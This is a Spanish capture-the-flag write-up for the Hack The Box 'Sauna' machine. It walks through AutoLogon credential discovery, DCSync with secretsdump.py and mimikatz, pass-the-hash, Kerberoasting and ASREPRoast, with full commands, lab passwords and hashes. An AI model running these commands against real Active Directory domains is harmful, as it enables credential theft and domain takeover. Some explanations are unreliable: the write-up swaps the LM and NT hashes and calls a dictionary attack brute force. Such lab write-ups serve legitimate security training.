[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) es una herramienta de enumeración de posibles vectores de escalada de privilegios. Su objetivo es buscar configuraciones erróneas, contraseñas en texto plano, tokens de acceso, y cualquier otro elemento que pueda ser útil para elevar privilegios en un sistema Windows.

Se subirá [winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx64.exe) al controlador de dominio. En este caso se utilizará el comando `upload` de **evil-winrm**:

```powershell
PS C:\Users\FSmith\Desktop> upload /home/r1pfr4n/Desktop/HTB/Sauna/content/winPEAS.exe
```

Posteriormente, se ejecutará el programa de la siguiente forma:

```powershell
PS C:\Users\FSmith\Desktop> .\winPEAS.exe
```

#### Identificación de credenciales AutoLogon con winPEAS.exe

Después de ejecutar winPEAS.exe, la herramienta identifica un conjunto de **credenciales AutoLogon almacenadas** en el sistema. Las credenciales descubiertas son las siguientes: `svc_loanmanager:Moneymakestheworldgoround!`.

![imagen 16](Pasted image 20230718021641.png)

Las **credenciales AutoLogon** son un tipo de información almacenada en un sistema Windows que permite a un usuario iniciar sesión automáticamente en una máquina sin tener que proporcionar manualmente su nombre de usuario y contraseña. Esta característica puede ser útil para simplificar el proceso de inicio de sesión, especialmente en entornos donde se requiere un reinicio frecuente de las máquinas. Sin embargo, este mecanismo también puede representar un riesgo de seguridad significativo, ya que las **credenciales AutoLogon se almacenan** en el registro de Windows **en texto plano**.

En este caso, las credenciales AutoLogon para el usuario **svc_loanmanager** se han almacenado en el registro de Windows. Estas mismas credenciales también podrían haberse descubierto visitando manualmente las siguientes claves del registro:

```powershell
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultUserName
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
```

El primer comando busca el valor `DefaultUserName` en el registro, que almacena el nombre del usuario para el AutoLogon, y el segundo comando busca el valor `DefaultPassword`, que almacena la contraseña correspondiente. Juntos, estos dos valores proporcionan las credenciales AutoLogon completas.

![imagen 17](Pasted image 20230718050431.png)

Finalmente, con las credenciales `svc_loanmgr:Moneymakestheworldgoround!` obtenidas, se abre la posibilidad de avanzar hacia la siguiente etapa de la escalada de privilegios. Según el **análisis** anterior realizado con **BloodHound**, se identificó una ruta potencial de ataque que implicaba al usuario **svc_loanmgr**. Este usuario tenía **permisos de DCSync** en el dominio **egotistical-bank.local**, lo que abre la posibilidad de realizar un **ataque DCSync** para obtener el hash NT del administrador del dominio.

Para **validar** que estas **credenciales** son efectivamente correctas y permiten el acceso, se puede ejecutar el siguiente comando utilizando la herramienta **crackmapexec**:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

Si la salida de este comando contiene un '**+**', significa que las credenciales son válidas y proporcionan acceso. Con esta validación, se puede proceder al siguiente paso, que implica el uso de estas credenciales en el **ataque DCSync** para obtener el **hash NT del administrador del dominio**.

#### Obteniendo el Hash NT del Administrador del Dominio

Se puede utilizar `secretsdump.py` en la máquina atacante para volcar el **NTDS** y obtener los hashes NT de todos los usuarios del dominio, incluido el del **administrador**:

```bash
r1pfr4n@parrot> secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

El resultado de la ejecución del comando anterior es el siguiente:

![imagen 18](Pasted image 20230718022125.png)

La línea interesante es la siguiente:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

En este caso, `Administrator` es el nombre de usuario completo, `500` es el RID (Relative Identifier), `823452073d75b9d1cf70ebdf86c7f98e` es el hash LM (Lan Manager) y `aad3b435b51404eeaad3b435b51404ee` es el hash NT (NTLM).

La técnica de **Pass The Hash** permite utilizar este hash NT para autenticarse como el usuario administrador sin necesidad de conocer la contraseña en texto plano. De esta manera, con las credenciales `Administrator:823452073d75b9d1cf70ebdf86c7f98e` se podría conectar a la máquina utilizando herramientas como **evil-winrm** o **psexec**. A continuación, se muestra el comando que se utilizaría para conectarse a la máquina como administrador del dominio utilizando **evil-winrm**:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```

![imagen 19](Pasted image 20230718022504.png)

Es importante mencionar que en el [Anexo III](#anexo-iii-ataque-dcsync-utilizando-mimikatz) se presenta una alternativa para realizar el ataque DCSync usando **mimikatz** en lugar de `secretsdump.py`. La elección de la herramienta dependerá de las condiciones específicas del entorno y las preferencias del atacante.

### root.txt

La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:

```powershell
PS C:\Users\Administrator\Desktop> type root.txt
3c833ce590ee7388f1d543f512d9691a
```
  
## Anexo I: Comprensión y explotación del Kerberoasting

En el contexto de este escenario en particular, la explotación del Kerberoasting no es necesaria para ganar acceso a la máquina ni para escalar privilegios. El usuario objetivo del Kerberoasting, **hsmith**, no tiene ningún privilegio interesante ni está asignado a ningún grupo de particular interés. Esta sección se incluye con el propósito de **explorar** y **explicar el concepto del Kerberoasting**, enriqueciendo así el análisis de las posibles técnicas de ataque en un entorno Windows.

### Kerberoasting en detalle

**Kerberoasting** es una técnica de ataque en la cual un atacante explota el protocolo de autenticación Kerberos de Windows para extraer hashes de contraseñas de cuentas de servicio. Este ataque se realiza solicitando tickets de servicio (TGS, Ticket-Granting Service) para todas las cuentas de servicio disponibles en el dominio, los cuales pueden ser descifrados fuera de línea para obtener el hash de la contraseña correspondiente. 

El proceso de autenticación Kerberos se realiza en tres pasos principales:

1. **Autenticación inicial:** Cuando un usuario inicia sesión, su contraseña se convierte en una clave secreta que se utiliza para cifrar y descifrar mensajes. El usuario solicita un ticket de concesión de ticket (TGT, Ticket-Granting Ticket) al KDC, el cual verifica las credenciales del usuario y, si son correctas, emite un TGT cifrado.

2. **Obtención de Ticket de Servicio (TGS):** Cuando el usuario desea acceder a un servicio, presenta su TGT al KDC junto con una solicitud de un ticket para ese servicio en particular. El KDC verifica el TGT y, si es válido, emite un ticket de servicio.

3. **Acceso al servicio:** El usuario presenta el ticket de servicio al servidor que aloja el servicio requerido. Si el ticket es válido, se otorga el acceso al servicio.

El **Kerberoasting** se aprovecha del segundo paso, la obtención de Ticket de Servicio. Los **TGS** están **cifrados con la contraseña del servicio al que dan acceso**. Un atacante puede solicitar estos tickets sin autenticarse y luego intentar descifrarlos fuera de línea. **Si la contraseña es débil, el atacante puede obtenerla con un ataque de fuerza bruta**. 

Por lo tanto, el Kerberoasting es un **ataque de post-explotación**, es decir, r**equiere que el atacante ya tenga acceso a una cuenta en el dominio** (aunque no necesariamente sea una cuenta con privilegios). También, el Kerberoasting se aprovecha de una característica de Kerberos y no es algo que pueda ser "parcheado" o "arreglado". 

![imagen 20](Pasted image 20230718053428.png)

En la próxima sección, se detallará cómo se llevó a cabo un ataque de **Kerberoasting en la máquina objetivo**.


### Explotación de Kerberoasting para obtener las credenciales de hsmith

El Kerberoasting es una técnica que se puede explotar para obtener contraseñas de cuentas de servicio no convencionales, aquellas que se configuran con la opción `ServicePrincipalName` (SPN). Un SPN es esencialmente un identificador único asignado a un servicio que se ejecuta en un servidor dentro de un dominio de Active Directory. Este identificador permite a los clientes de la red identificar y autenticarse con ese servicio.

En este caso, la explotación comienza con las credenciales ya conocidas del usuario **fsmith**, `fsmith:Thestrokes23`. Las credenciales del usuario **fsmith** nos proporcionan una base de entrada inicial en el dominio.

Con estas credenciales, podemos solicitar los Tickets de Concesión de Servicio (TGS) para las cuentas de servicio configuradas con un SPN en el dominio utilizando la herramienta **GetUserSPNs.py**. El comando utilizado es el siguiente:

```shell
r1pfr4n@parrot> GetUserSPNs.py 'egotistical-bank.local/fsmith:Thestrokes23' -dc-ip 10.10.10.175 -request
```

**GetUserSPNs.py** es una herramienta de [Impacket](https://github.com/fortra/impacket).  En este comando, `egotistical-bank.local/fsmith:Thestrokes23` son las credenciales del usuario de dominio, `-dc-ip 10.10.10.175` especifica la dirección IP del controlador de dominio (DC), y `-request` solicita los TGS para los SPNs.

Después de ejecutar este comando, se encontró un error `KRB_AP_ERR_SKEW`, que indica una discrepancia temporal entre la máquina del atacante y el Controlador de Dominio:

![imagen 21](Pasted image 20230718005300.png)

Para solucionar esto, se utilizó el comando `ntpdate` para sincronizar el tiempo de la máquina del atacante con el del DC:

```shell
r1pfr4n@parrot> sudo ntpdate 10.10.10.175
```

Después de la sincronización, se volvió a ejecutar el comando `GetUserSPNs.py`, obteniendo el TGS para la cuenta de servicio **hsmith**:

![imagen 22](Pasted image 20230718005859.png)

El TGS es el siguiente:

```shell
$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$egotistical-bank.local/HSmith*$46a15347878023cdbfe81dd0e8d48814$703ddd260fde486771e73b69536270e0ba328e5bb57ab6a8af9285940968c319c129e8646d0520b1146b125e12a353ac62b3d683307c8fa75ffbd94a6120f1c6f2dd2ac723eb8e4a72ac7211bdbd400d0cd6177ac203b8b634751d8e2c0fadc9ca895fa57e3bada5550bb585338f38459039c162c3c62166b0b23b135773a78b6c561dbdfca48b7dbe9f981fb994c5f7b03ec9775d184bb92a49f9a636250ee65747edaa9437440a6181e4f962686ebb30645180a2837cad84d51260eb04cf9e5cfa88ca9415c83834a28f91b3f605b742b940f309a85d9a6580c9c6d86b4ba34768c8a195998e9ed68fb5f67adfb03374097cd4664d533ac0862cc3749ac19a490f09dbc98328472e9238918c4ceafbe3ececfc695b7f83f8e82545e13f384e05d9c9d19c43d8186670aa4c07ae2dc4f1914e969cd6a727315675223eb02475a48415f748f63773df1900a66e3050131d938fa58620ee04a5fe244866945136321f84b409ed7f1b87fd518e2a2ef3c6321a3cb72c84ed26357cba000d3671782af9d31c56026cb7b50473925cd6ee905cbba0e7d59c0bcc83817a02d6d13794db8c0242fc947bf29965e8a149df4fa6b35b53ad79823d7aded6e9f2e30c691fa09699c9d69b652d145413713341f228a771cb265a92bffc83061057097e9c72b27e801f57ad478fcc9b03f7b68a2cccefc3f7058f8d1e760e127017cecba8ec30deba71b77ace53692d5839e33c1889bf96e00ebffa09b7c0b447c37eda1fb3e2e93a958409d53b585bd88cdf3547903d0b253342e9548ec8e3ac2439a65f8b0085fd25edbbb14b8f2cf53e0a989acfa76746f0264786fa46f43e2eb57a921a07be7f7834bcbe59843e3eaf6cc3f1bd6ed98bfa2223d831fb80d354b9b3bfd791737da5b171f5abcd57a358df6be0748a008c35f6f09ae8218db4fabcac266b26e5fb26c7dd164bfae658aca1acabeab67d788ff437ad5df8d7c65d93bccecdae78665b679e61f663feb0dcf2424cff215a48aec6b8e5456a8abe8e5e5944e0f58fce3f8785d16889e636fa26595b6a1862bf17efca7680ed30ae0ab8b9714d2a9ed7c9f3c4a38cdc2fdc50edef77b1da269e6f916cccaa9956c99ce31838cb48963fc4e356d2449af2d89d059ecc79598def95441210da276b2fa4341b4da25f4db561f9ce31d6b1520926b8f6ddfaee3722e609c37559a8edb71a4a92f531a66e2b32f71591f66f0dd58049090199583bd385bcd4d599c752eaa92729bc902ad244fbb5ce9942057c46937a994be911d0245b3ceb8163450533c1980730635aff1f3c69bf73b4b595f0babd2eb7e74fee80e21c982071f384181184f5be80357fcbe3efc5111c29866baf871a0c5093a6b83c5268fc737d5037e13aeb2186019fc2e3f5
```

La salida `SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111` representa el Service Principal Name (SPN) asociado a **hsmith**, que es, en efecto, una cuenta de servicio.

Este hash de TGS, que contiene la contraseña de la cuenta de servicio **hsmith** cifrada, se guardó en un archivo llamado **hash**. Se usó la herramienta **john**, que es un cracker de contraseñas, para descifrar el hash a través de un ataque por diccionario:

```shell
r1pfr4n@parrot> john -w=/usr/share/wordlists/rockyou.txt hash
```

Al final, se descubrió que la contraseña de la cuenta de servicio **hsmith** es **TheStrokes23**:

![imagen 23](Pasted image 20230718005815.png)

Una vez obtenidas estas credenciales, se pueden utilizar de la misma forma que las credenciales de cualquier otro usuario del dominio. Sin embargo, las cuentas de servicio como **hsmith** pueden tener privilegios o accesos específicos dependiendo de su configuración y uso. En este caso, obtener las credenciales de **hsmith** no proporcionó acceso o privilegios adicionales. Sin embargo, en otros escenarios, esta técnica podría permitir comprometer cuentas de servicio con privilegios más elevados.

## Anexo II: Ataque Kerberoasting y ASREPRoast utilizando ADSearch y Rubeus

En ciertas situaciones, un ataque Kerberoasting o ASREPRoast no se puede llevar a cabo desde la máquina del atacante. Esto suele suceder cuando el **Domain Controller (DC) no expone el puerto 88** (el puerto utilizado por el protocolo Kerberos) a la red externa, pero sí lo hace a la red interna. Este tipo de configuración puede ser una medida de seguridad para limitar las posibles vías de ataque al DC.

En este contexto, **el atacante necesita estar dentro de la red interna para realizar estos ataques**. Por eso, estas técnicas se suelen usar en ataques post-explotación, es decir, después de que el atacante ya ha ganado acceso a una máquina interna del dominio.

### ADSearch.exe y Rubeus.exe para ataques granulares

El uso de las herramientas **ADSearch.exe** y **Rubeus.exe** proporciona una forma más **granular** y controlada de realizar los **ataques Kerberoasting y ASREPRoast**. Ambas herramientas se pueden ejecutar desde una máquina Windows dentro del dominio.

**ADSearch.exe** es una herramienta que permite realizar **consultas a LDAP**, que es el protocolo utilizado para interactuar con el DC. Esta herramienta es útil en este contexto porque permite al atacante identificar las cuentas que son vulnerables a los ataques Kerberoasting y ASREPRoast. De esta forma, el atacante puede seleccionar qué cuentas quiere atacar, en lugar de atacar todas las cuentas vulnerables de una vez, lo que podría desencadenar alarmas de seguridad.

**Rubeus.exe** es una herramienta de post-explotación que se utiliza para **interactuar con Kerberos**. En particular, se puede utilizar para realizar ataques Kerberoasting y ASREPRoast contra las cuentas seleccionadas identificadas por ADSearch.exe.

Estas herramientas se pueden obtener del repositorio de GitHub en el siguiente enlace: [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64).

### ASREPRoasting

Para identificar las cuentas que son susceptibles a ASREPRoast, se utiliza el siguiente comando con `ADSearch.exe`:

```powershell
PS C:\Users\FSmith\Desktop> .\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```

Este comando realiza una consulta LDAP al Domain Controller, buscando cuentas de usuario que tienen la bandera `DONT_REQUIRE_PREAUTH` establecida. Esta bandera indica que la cuenta es vulnerable a ASREPRoast. Los atributos `cn`, `distinguishedname` y `samaccountname` proporcionan información adicional sobre cada cuenta encontrada.

En este caso, solo la cuenta `fsmith` resultó ser susceptible a ASREPRoast:

![imagen 24](Pasted image 20230718013034.png)

Para solicitar el Ticket Granting Ticket (TGT) de la cuenta `fsmith`, se utiliza el siguiente comando con `Rubeus.exe`:

```powershell
PS C:\Users\FSmith\Desktop> .\Rubeus.exe asreproast /nowrap /simple /user:fsmith /format:hashcat
```

El comando `asreproast` de `Rubeus.exe` solicita un TGT para una cuenta sin necesidad de proporcionar la contraseña de la cuenta. El parámetro `/user:fsmith` especifica que solo se quiere solicitar el TGT de la cuenta `fsmith`. Si se quisiera solicitar los TGT de todas las cuentas vulnerables, no se necesitaría especificar este parámetro. El parámetro `/format:hashcat` indica que el hash del TGT se debe mostrar en un formato que pueda ser utilizado por la herramienta de cracking de contraseñas `hashcat`.

![imagen 25](Pasted image 20230718013348.png)

Finalmente, se utiliza `hashcat` para tratar de descifrar la contraseña de la cuenta `fsmith`:

```bash
r1pfr4n@parrot> hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt 
```

El parámetro `-m 18200` especifica el tipo de hash (en este caso, Kerberos 5 AS-REP etype 23), y el parámetro `-a 0` indica que se debe utilizar el modo de ataque de fuerza bruta (brute force). `hash` es el archivo que contiene el hash del TGT, y `/usr/share/wordlists/rockyou.txt` es la lista de palabras a utilizar en el ataque de fuerza bruta.

Al final, `hashcat` es capaz de descifrar la contraseña de la cuenta `fsmith`, que es `Thestrokes23`:

![imagen 26](Pasted image 20230718013456.png)

### Kerberoasting 

Para identificar las cuentas que tienen un Service Principal Name (SPN) asociado, lo cual indica que pueden ser susceptibles a Kerberoasting, se utiliza el siguiente comando con `ADSearch.exe`:

```powershell
PS C:\Users\FSmith\Desktop> .\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```

Este comando realiza una consulta LDAP al Domain Controller, buscando cuentas de usuario que tienen un SPN establecido. Los atributos `cn`, `servicePrincipalName` y `samaccountname` proporcionan información adicional sobre cada cuenta encontrada.

En este caso, solo la cuenta de servicio `hsmith` resultó ser susceptible a Kerberoasting:

![imagen 27](Pasted image 20230718013536.png)

Para realizar Kerberoasting sobre la cuenta `hsmith`, se utiliza el siguiente comando con `Rubeus.exe`:

```powershell
PS C:\Users\FSmith\Desktop> .\Rubeus.exe kerberoast /nowrap /simple /user:hsmith /creduser:egotistical-bank.local\fsmith /credpassword:Thestrokes23 /format:hashcat
```

El comando `kerberoast` de `Rubeus.exe` solicita un Ticket Granting Service (TGS) para un servicio asociado a la cuenta `hsmith`. El parámetro `/user:hsmith` especifica que solo se quiere solicitar el TGS de la cuenta `hsmith`. Los parámetros `/creduser` y `/credpassword` proporcionan las credenciales del usuario (en este caso, `fsmith`) que está realizando la solicitud. El parámetro `/format:hashcat` indica que el hash del TGS se debe mostrar en un formato que pueda ser utilizado por la herramienta de cracking de contraseñas `hashcat`.

![imagen 28](Pasted image 20230718012622.png)

Finalmente, se utiliza `hashcat` para intentar descifrar la contraseña de la cuenta `hsmith`:

```bash
r1pfr4n@parrot> hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

El parámetro `-m 13100` especifica el tipo de hash (en este caso, Kerberos 5 TGS-REP etype 23), y el parámetro `-a 0` indica que se debe utilizar el modo de ataque de fuerza bruta (brute force). `hash` es el archivo que contiene el hash del TGS, y `/usr/share/wordlists/rockyou.txt` es la lista de palabras a utilizar en el ataque de fuerza bruta.

Al final, `hashcat` es capaz de descifrar la contraseña de la cuenta `hsmith`, que es `Thestrokes23`:

![imagen 29](Pasted image 20230718012820.png)

## Anexo III: Ataque DCSync utilizando mimikatz

Aunque en la ruta principal hacia el control del dominio se utilizó la herramienta `secretsdump.py` para explotar el ataque DCSync desde la máquina del atacante, existe otra manera de llevar a cabo este ataque utilizando **mimikatz**. 

**Mimikatz** es una herramienta que permite la manipulación de la seguridad en Windows, conocida por su capacidad para extraer contraseñas en texto plano, hashes, PINs y tickets de Kerberos de la memoria. 

De hecho, es la herramienta que **BloodHound** muestra para llevar a cabo el ataque DCSync:

![imagen 30](Pasted image 20230718051330.png)

Para efectuar el ataque DCSync con **mimikatz**, es necesario crear una sesión con `svc_loanmgr` y posteriormente ejecutar `mimikatz.exe`.

Primero, se necesita confirmar que el usuario `svc_loanmgr` puede conectarse a través de WinRM. Para ello, se utiliza la herramienta `crackmapexec`:

```bash
r1pfr4n@parrot> crackmapexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

El resultado muestra `Pwned!`, lo que indica que `svc_loanmgr` forma parte del grupo `Remote Management Users` y puede conectarse a través de WinRM:

![imagen 31](Pasted image 20230718184744.png)

A continuación, se utiliza la herramienta `evil-winrm` para iniciar una sesión:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

Una vez establecida la sesión, se sube el archivo `mimikatz.exe` a la máquina de destino usando el comando `upload` de `evil-winrm`:

```bash
PS C:\Users\svc_loanmgr\Documents> upload /home/r1pfr4n/Desktop/HTB/Sauna/content/mimikatz.exe
```

Descarga del binario de [mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe).

Finalmente, se ejecuta el siguiente comando en la sesión de `evil-winrm`:

```bash
PS C:\Users\svc_loanmgr\Documents> .\mimikatz "lsadump::dcsync /domain:egotistical-bank.local /user:Administrator" exit
```

- `"lsadump::dcsync /domain:egotistical-bank.local /user:Administrator"`: Es el comando específico que realiza el ataque DCSync, pidiendo la sincronización de hashes de contraseñas del usuario "Administrator" del dominio "egotistical-bank.local". Este es el comando que recomienda BloodHound, adaptado al dominio de este escenario.

Al ejecutar este comando, se obtiene el hash NT del usuario administrador del dominio: `823452073d75b9d1cf70ebdf86c7f98e`. 

![imagen 32](Pasted image 20230718190531.png)